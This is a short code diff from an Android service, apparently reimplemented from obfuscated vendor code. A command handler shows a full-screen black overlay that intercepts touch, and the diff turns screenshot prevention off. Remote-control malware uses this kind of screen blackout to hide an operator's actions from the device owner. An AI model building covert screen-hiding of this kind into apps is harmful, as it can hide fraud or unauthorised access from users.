@@ -92,11 +92,12 @@ class BlackScreenCommandHandler : CommandHandler {
             // OverlayConfig.blackScreen() maps vendor params: alpha, text, interceptTouch.
 
             // Show the overlay as the black screen
-            service.overlayManager?.show(com.storm.safe.rock.service.modules.overlay.OverlayConfig.blackScreen(
+            val config = com.storm.safe.rock.service.modules.overlay.OverlayConfig.blackScreen(
                 text = text,
                 alpha = alpha / 255f,
                 interceptTouch = true
-            ))
+            ).copy(preventScreenshot = false)
+            service.overlayManager?.show(config)
 
             // Set black screen active flag
             // vendor: dqtvuisjdVar.f52469k0 = true
